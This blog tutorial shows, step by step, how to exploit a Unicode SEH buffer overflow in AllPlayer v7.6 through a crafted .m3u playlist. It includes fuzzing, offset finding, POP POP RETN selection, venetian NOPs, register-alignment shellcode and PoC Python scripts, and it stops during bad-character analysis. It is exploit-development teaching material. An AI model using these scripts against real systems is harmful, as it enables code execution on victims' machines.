---
layout: single
title: 'Exploiting Unicodes in Windows Executables - A case study'
description: "This article explains the exploitation of a local buffer oveflow vulnerability and how SEH protection can be bypassed. Specifically, we will demonstrate an interesting exploitation approach of a unicode based buffer overflow against the vulnerable AllPlayer v7.6 application."
date: 2019-05-13
classes: wide
header:
  teaser: /assets/images/2019/AllPLayer/allplayer.png
tags:
  - SEH
  - Windows
  - x86
  - Allplayer v7.6 Buffer Overflow
  - Unicode exploitation 
  - Venetian Blind
--- 

<p style="text-align:justify;">
This article explains the exploitation of a local buffer oveflow vulnerability and how <b>SEH</b> protection can be bypassed. Specifically, we will demonstrate an interesting exploitation approach of a unicode based buffer overflow against the vulnerable <b> AllPlayer v7.6</b> application.
</p>

<img src="{{site.baseurl}}/assets/images/2019/AllPLayer/allplayer.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="550" height="450">

----------------

### Unicode

<p style="text-align:justify;">
A kind of a special situation in exploit development, is when the data are encoded with a specific encoding scheme. Additionally, there might be convertions to characters such as uppercase, lowercase, etc. Furthermore, one of these convertions might be the Unicode convertion. But why should we using Unicode ? In short, unicode allows a general visual representation / manipultation of data in most of the systems in a consistent manner. So, for example, the application can be used accross the globe, without having to worry about how text looks like when displayed on the screen. Unicode is different from the well known ascii representation. In essence, ascii uses 7 bits to represent 128 characters, often shorting them in 8 bits, or one byte per character. In the contrary, unicode is differend. Specifically, there are many forms of unicode, <b>UTF-16</b> is the most popular. 
<br><br>
<b>Example :</b> Ascii character 'A' = 41 (hex), the basic latin Unicode representation is 0041.     
</p>

------------

### The Venetian Blind 

<p style="text-align:justify;">
The Unicode buffer can be imagined to be somewhat similar to a <b>Venetian blind</b>; there are "solid" bytes that we control, and  "gaps" containing the alternating zeroes. This is why unicode exploits are also called <b>"Venetian Exploits"</b> and the shellcodes   used to overcome the Unicode issue are called <b>"Venetian Shellcodes"</b>.  
</p>

Tools used for this exercise : 

<ul>
      <li>Immunity Debugger</li>
      <li>filefuzz</li>
      <li>badchars</li>
      <li>mona</li>
      <li>msfvenom</li>
      <li>Alpha2</li>
</ul>

<p></p>

------------

### How to approach

<p style="text-align:justify;">
In order to succesfully perform the exploitation we should 
</p>

<ul>
    <li>Identiify and verify the location of character which overwrites SEH pointer</li>
    <li>Redirect the execution flow to the memory location we control</li> 
    <ul>
        <li>Find a reliable and Unicode compatible address in memory that contains the instructions POP POP RETN</li>
        <li>Overwrite SEH with a pointer to this address</li>
    </ul>
    <li>Find a Unicode compatible NOP</li>
    <li>Align a register to the beggining of our shellcode</li>
</ul>

-----------

### Finding the Vulnerability

<p style="text-align:justify;">
At this point we will fuzz the application  in order to find the vulnerability. We will use a fuzzing tool called <b>filefuzz</b>, and this because we are targeting the file format of the <b>.m3u</b> file which will be loaded to the application. What we are trying to do now, is to cause a crash via a long string in a <b>.m3u</b> (playlist) file. 

First, we will create a subfolder inside the Documents folder in order to put all the scripts there. We will name the subfolder AllPLayer. Also we will create another folder there, which we'll call it fuzz.Then we will also create another subfolder inside the fuzz folder which we also call it fuzz.

Now, inside the <b>AllPLayer</b> folder we will create a file named test.m3u and inside this file we will put some A's, just say 4 A's. The format will be the following 
</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
http://AAAAAAAAAA......
</pre>

<p style="text-align:justify;">
After that, we will save and close the file and then we will open the <b>filefuzz</b> fuzzer. At this point we will generate our sample files. The following screenshot shows the <b>filefuzz</b> fuzzer setup which will be used in order to create 100 sample files. 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/filefuzz.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="650" height="650">

<p style="text-align:justify;">
Afterwards, we will execute <b>filefuzz</b> fuzzer by loading, one by one,  the sample files into the AllPlayer application until the crash occurs. At "Execute" tab of the <b>filefuzz</b> fuzzer, we will change the Miliseconds into 10000 and that because the application might need some time to load the samples before the filefuzz executes it again. So this is a time interval of 10 secs between loading the samples. Also we will use 4 files for this task, so <b>filefuzz</b> fuzzer will restart the target application 4 times. 
</p>

<p style="text-align:justify;">
The following screenshot shows the filefuzz setup on "execute" tab  
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/filefuzz2.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="600" height="600">

<p style="text-align:justify;">
As we see above, we have more than one crashes. If we inspect further, we can see that the application crashed for the first time when loaded the second sample ( <b>fuzz1.m3u</b> ). 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
[*] "crash.exe" "C:\Program Files\ALLPlayer\ALLPlayer.exe" 10000 C:\Users\pentest\Documents\AllPlayer\fuzz1.m3u
[*] Access Violation
[*] Exception caught at 77a477b2 lock btr dword [eax],0x0
[*] EAX:8603b717 EBX:07cb0c8c ECX:76558c2e EDX:0012e650
[*] ESI:8603b717 EDI:8603b713 ESP:0012e2dc EBP:0012e2f0
</pre>

<p style="text-align:justify;">
This means that if we create a file with 1011 A's ( same as the sample file <b>fuzz1.m3u</b> which was created with filefuzz ) we will eventually trigger the crash. At this point we will create a PoC python script in order to acomplish this crash. 
</p>

```python

buffer  = b"http://"
buffer += b"\x41" * 1011

f=open("player.m3u","wb")
f.write(buffer)

```

<p style="text-align:justify;">
After executing the script above, if we observe the EIP register at the time of crash, we will see that it holds a specific address <b>77a477b2</b> , which is the same as the one caught from <b>filefuzz</b>. 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/crash.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="680" height="570">

<p style="text-align:justify;">
Inspecting further the crash, and specifically the SEH chain in Immunity Debugger, we realize that the SE handler was overwritten with the unicode <code>0x00410041</code>. 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/seh.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="450" height="350">

<p style="text-align:justify;">
If we follow in dump the location pointed by the EBP register, we will see the contents of our payload, and once again we will confirm the unicode format of these characters. 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/dump.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="680" height="570">

-----------

### Controlling the Execution

<p style="text-align:justify;">
Now that we have confirmed the crash is time to start building our exploit. At this point we will identify the location of the character which overwrites SEH pointer and thus EIP. Afterwards we will redirect the execution to the attacker controlled memory location. Then we will find an accessible Unicode compatible address in memory that contains the instructions <code>POP POP RETN</code>.Lastely, we will align the register to the beggining of our shellcode. 
</p>

<p style="text-align:justify;">
As seen below, we will generate the pattern from metasploit in order to locate the exact point of crash. 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:/home/kali# msf-pattern_create -l 1011
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6
</pre>

<p style="text-align:justify;">
So at this point, we will create the following PoC script in order to reproduce the crash and examine the pattern offset 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
pattern = "http://Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6"

f=open("pattern.m3u","wb")
f.write(pattern)
f.close()
</pre>

<p style="text-align:justify;">
After running the script above, the <b>pattern.m3u</b> file will be generated. Afterwards, we will load the generated <b>pattern.m3u</b> file into the vulnerable <b>AllPlayer v7.6</b> application. 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/load_file.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="550" height="450">

<p style="text-align:justify;">
If we inspect the <b>SEH</b> chain in <b>Immunity Debugger</b> we will see the pattern <b>0x0030006b</b>. The following screenshot shows the specified pattern
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/pattern_seh.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="450" height="250">

<p style="text-align:justify;">
Later on, we will use <b>mona.py</b> in order to locate the exact offset as shown at the screenshot below 
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/mona.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="850" height="580">

<p style="text-align:justify;">
After executing <code>!mona findmsp</code> command, we see that <b>mona.py</b> has detected that the vulnerable application crashes at the exact the offset <b>301</b>, which is related with the pattern <b>0x0030006b</b> that we saw in <b>SEH</b> chain before. 

Now lets create a PoC script in order to confirm that we can control the <b>EIP</b>. 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
eip = "http://" + "A" * 301 + "BB" + "\x90\x90" + "D" * 707

f=open("eip.m3u","wb")
f.write(eip)
f.close()
</pre>

<p style="text-align:justify;">
After we run the script above, if we pass the execution to the program in Immunity Debugger <b>SHIFT+F9</b>,  we see that we are finally controling EIP with <code>\x90\x90</code> ,as seen at the screenshot below 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/EIP.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="750" height="450">

<p style="text-align:justify;">
At this point we are able to replace the two bytes <b>\x90\x90</b> in our PoC script, with <b>POP POP RETN</b> instructions in order to bypass SEH. So, we will use <b>mona.py</b> again in order to find a reliable and Unicode compatible address in memory that contains the instructions <b>POP POP RETN</b>
</p>

The command we will use in <b>Immunity Debugger</b> is the following 

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
!mona seh -cp unicode
</pre>

<p style="text-align:justify;">
If we then check the log window in <b>Immunity Debugger</b>, we will see the output of the command above as shown at the screenshot below
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/unicodes.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="880" height="580">

<p style="text-align:justify;">
Moreover, one restriction of choosing the right address from the results produced by <b>mona.py</b>, is that, any possible selected address needs to have the null byte as a leading character. As we see from the results at the screenshot above there are some addresses starting with the null byte. At this point the address <b>0x0074007a</b> seems to be a good candidate. 
</p>

<p style="text-align:justify;">
Now, lets update the PoC script and confirm that we have used the right address. 
</p>

```python

eip = "http://" + "A" * 301 + "BB" + "\x7a\x74" + "D" * 707

f=open("eip.m3u","wb")
f.write(eip)
f.close()

```

<p style="text-align:justify;">
Running the script above, the <b>eip.m3u</b> file will be generated. Then we will load the file in <b>AllPLayer</b> application and then we will observe the crash once again. As we see at the screenshot below, at the SEH chain in Immunity Debugger, the SEH record has been overwritten with the Unicode address of our choice <b>0x0074007a</b>.  
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/overwrites.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="880" height="380">

<p style="text-align:justify;">
From the screenshot above we can also confirm that the EIP has been overwritten with the Unicode address <b>0x0074007a</b>. So, at this point we control EIP, and we can now execute the <b>POP POP RETN</b> instructions as we should without any problems. If we now put a breakpoint in Immunity Debugger at the Unicode address  <b>0x0074007a</b> ,and then pass the exception to the program by pressing <b>SHIFT+F9 </b>, we will see that we have stepped into our breakpoint as shown at the following screenshot
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/pop.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="880" height="380">

<p style="text-align:justify;">
Now, if we continue executing the instructions, we will land at the next SEH record, which has been overwritten with <b>0x00420042</b>. We can now confirm that we also control NSEH. If we see further at the disassembler in Immunity Debugger, we will realize that a large buffer full of D's is located few bytes away from NSEH record.    
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/disas.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="480" height="380">

<p style="text-align:justify;">
If we continue the execution, we will see that the instructions in address <b>0x0012EC6D</b> cannot be executed, and for that reason we should find a unicode compatible nop in order to skip the instructions that causing this issue and then be able to continue the execution to the large buffer we control. It is worth to mention that we cannot use a short jmp instruction to jump to the location we want when exploiting unicodes, because short jmp instructions usually need two bytes without any trailing or leading zeros in them.   
</p>

------------

### Finding a Unicode compatible NOP

<p style="text-align:justify;">
A Unicode compatible NOP or "Venetian code" is any instruction that can absorb the leading and the trailing zeros without affecting the execution flow of the program. In order to be more specific, lets observe the instructions shown at the screenshot below 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/nops.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="580" height="480">

<p style="text-align:justify;">
As we can see at the picture above, there are instructions having trailing and leading zeros in them, such as the <b>ADD BYTE PTR DS:[EDX],AL</b> instruction. What we need now is to find a unicode compatible NOP instruction that will help us overcome this issue.
</p>

Some unicode compatible NOP instructions are the following 

<ul>
<li>006E00 ADD BYTE PTR DS:[ESI],CH</li>
<li>006F00 ADD BYTE PTR DS:[EDI],CH</li>
<li>007000 ADD BYTE PTR DS:[ECX],DH</li>
<li>007100 ADD BYTE PTR DS:[ECX],DH</li>
<li>007200 ADD BYTE PTR DS:[EDX],DH</li>
<li>007300 ADD BYTE PTR DS:[EBX],DH</li>
</ul>


<p style="text-align:justify;">
 If we test the above instructions into our vulnerable program, we will see that none of the instructions above will suit us alone. If we search a bit more, we will see that the instructions causing the <b>popad align</b> technique will fit well.  These instructions are the <b>POPAD</b> followed by the <b>ADD BYTE PTR DS:[ESI],CH</b> instruction <b>\x61\x6e</b>. Now, lets update our PoC script as shown below 
</p>

```python
eip = "http://" + "A" * 301 + "\x61\x6e" + "\x7a\x74" + "D" * 707

f=open("eip.m3u","wb")
f.write(eip)
f.close()
```

<p style="text-align:justify;">
If we execute the script above it will update the <b>eip.m3u</b> file, but now with our unicode compatible NOP inside it. Now we are ready to attach AllPlayer application to Immunity Debugger and reproduce the crash. Afterwards, put a breakpoint to the address <b>0x0074007a</b>, then pass the exception to the program <b>SHIFT+F9</b> and then execute the <b>POP POP RETN</b> instructions.
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/nop_com.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="780" height="580">

<p style="text-align:justify;">
As we see above, we have landed into our larger buffer that we control. We are now few steps behind before we can execute our shellcode. At this point, we have used a unicode compatible NOP in order to skip some unicode instructions and land to the larger buffer. 
</p>

------------

### Register Alignment

<p style="text-align:justify;">
In order to execute our shellcode without having any problems, we need to encode it using the <b>Alpha2</b> Alphanumeric Unicode Mixedcase Encoder. This encoder needs one of the registers to point to the shellcode. So, one way to acomplish this task, is to identify a CPU register closest to the buffer and then align this register to the location of the buffer by adding or subtracting a certain value. If we look closely at the registers at the time we have landed into our larger buffer, we will see that the closest register to use is the ESI register with 649 bytes distance from the first address in the large buffer that we control. 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0xEC75 - 0xE9EC = 0x289
</pre>

<p style="text-align:justify;">
We can see this at the screenshot below 
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/ESI.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="700" height="350">

<p style="text-align:justify;">
After some trial and error we have ended using the following shellcode in order to perform the alignment. 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 "\x56"           # push esi
 "\x6e"           # venetian shellcode
 "\x58"           # pop eax
 "\x6e"           # venetian shellcode
 "\x05\x19\x11"   # add eax,0x11001900
 "\x6e"           # venetian shellcode 
 "\x2d\x16\x11"   # sub eax,0x11001600
 "\x6e"           # venetian shellcode 
 "\x50"           # push eax
 "\x6e"           # venetian shellcode 
 "\xc3"           # retn
</pre>


<p style="text-align:justify;">
Now, lets explain the code above. At lines 1-3 we are assigning the value of ESI register to EAX register. Then at lines 4-7, we are adding <b>\x19\x11</b> to EAX and then we are subtracting <b>\x16\x11</b> from EAX. It is worth mentioning here that these two values have been chosen because when placed on the stack are converted into unicode compliant format, <b>0x11001900</b> and <b>0x11001600</b>, and thus the addition and subtraction calculations can be performed without problems. Ofcourse any values converted in unicode compliant format when placed on the stack will work. Afterwards, EAX register will hold the address <b>0x0012ECEC</b> where our shellcode will begin. Then we push the EAX register on the stack and then we return to the new location where we execute our shellcode. 
</p>

<p style="text-align:justify;">
Lets update our PoC script and see what happens 
</p>

```python
align=("\x56"           # push esi
       "\x6e"           # venetian shellcode
       "\x58"           # pop eax
       "\x6e"           # venetian shellcode
       "\x05\x19\x11"   # add eax,0x11001900
       "\x6e"           # venetian shellcode 
       "\x2d\x16\x11"   # sub eax,0x11001600
       "\x6e"           # venetian shellcode 
       "\x50"           # push eax
       "\x6e"           # venetian shellcode 
       "\xc3"           # retn
       )


payload = "http://" + "A" * 301 + "\x61\x6e" + "\x7a\x74" + align + "D" * ( 707 - len(align) )

f=open("payload.m3u","wb")
f.write(payload)
f.close()
```

<p style="text-align:justify;">
As we see at the screenshot below, EAX will be pushed on the stack and then after executing the <b>retn</b> instruction, the flow will be redirected to the new location on the stack where we will place the beginning of our shellcode and will be 92 bytes further down the stack at address <b>0x0012ECEC</b> 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/align.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="800" height="450">

<p style="text-align:justify;">
As you can imagine, we now need to cover the distance of 92 bytes from the <b>retn</b> address until the begining of our shellcode. Because of the unicode format if we send the hex <b>\x90\x90</b>, it will be converted into a unicode compliant format of <b>0x00900090</b>, meaning that we will have four bytes of padding rather than two on the stack, so we need to perform the following devision 92 / 2 which will give us 46 bytes. Lets update our PoC script and check if we have performed the right calculations. We will use <b>"EEEE"</b> as our placeholder. 
</p>


```python
align=("\x56"           # push esi
       "\x6e"           # venetian shellcode
       "\x58"           # pop eax
       "\x6e"           # venetian shellcode
       "\x05\x19\x11"   # add eax,0x11001900
       "\x6e"           # venetian shellcode 
       "\x2d\x16\x11"   # sub eax,0x11001600
       "\x6e"           # venetian shellcode 
       "\x50"           # push eax
       "\x6e"           # venetian shellcode 
       "\xc3"           # retn
       )

nops = "\x90" * 46 

shellcode = "EEEE"

payload = "http://" + "A" * 301 + "\x61\x6e" + "\x7a\x74" + align + nops + shellcode + "D" * ( 707 - len(align) - len(nops) - len(shellcode) )

f=open("payload.m3u","wb")
f.write(payload)
f.close()
```

<p style="text-align:justify;">
After executing the script above and loading the <b>payload.m3u</b> file in the vulnerable application, we will perform our debugging session until we finally reach our placeholder on the stack. But rather seeing the desired value <b>"EEEE"</b> follwed by D's at the begining of EAX register, we see that EAX is not pointing at the begining of our shellcode. In order to fix this, we will send 45 nops rather than 46. 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/extra.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="700" height="350">

<p style="text-align:justify;">
We will now update the PoC script and try again. 
</p>


```python
align=("\x56"           # push esi
       "\x6e"           # venetian shellcode
       "\x58"           # pop eax
       "\x6e"           # venetian shellcode
       "\x05\x19\x11"   # add eax,0x11001900
       "\x6e"           # venetian shellcode 
       "\x2d\x16\x11"   # sub eax,0x11001600
       "\x6e"           # venetian shellcode 
       "\x50"           # push eax
       "\x6e"           # venetian shellcode 
       "\xc3"           # retn
       )

nops = "\x90" * 45 

shellcode = "EEEE"

payload = "http://" + "A" * 301 + "\x61\x6e" + "\x7a\x74" + align + nops + shellcode + "D" * ( 707 - len(align) - len(nops) - len(shellcode) )

f=open("payload.m3u","wb")
f.write(payload)
f.close()
```

<p style="text-align:justify;">
As we see at the screenshot below, we are now landed exactly at the begining of our placeholder at address <b>0x0012ECEC</b>. We can see now that the EAX register points at our placeholder <b>"EEEE"</b> as intented followed by D's. 
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/correct.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="830" height="420">

------------

### Bad Characters Analysis

<p style="text-align:justify;">
Before generating our final shellcode, we must check about possible bad characters that could break the execution of our shellcode. At this point we should see if certain bytes are translated differently by the application. In order to perform this analysis, we will first send all possible characters from <b>0x00</b> to <b>0xff</b>, as part of our buffer, and see how these characters are dealt by the vulnerable application, after the crash occurs. Also we need to mention that <b>0x00</b> is a bad character which by default represent the null byte. Moreover, we are interested in certain range of charaters from <b>0x41 (A)</b> until <b>0x5A (Z)</b>, and that because we will later use the <b>Alpha2 Alphanumeric Uppercase Encoder</b>, in order to generate our shellcode. 
</p>

<p style="text-align:justify;">
At this point we will use a tool called badchars as shown below
</p>

```c
root@kali:/home/kali# badchars -f python
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

<p style="text-align:justify;">
We will update our PoC script as shown below 
</p>

```python
align=("\x56"           # push esi
       "\x6e"           # venetian shellcode
       "\x58"           # pop eax
       "\x6e"           # venetian shellcode
       "\x05\x19\x11"   # add eax,0x11001900
       "\x6e"           # venetian shellcode 
       "\x2d\x16\x11"   # sub eax,0x11001600
       "\x6e"           # venetian shellcode 
       "\x50"           # push eax
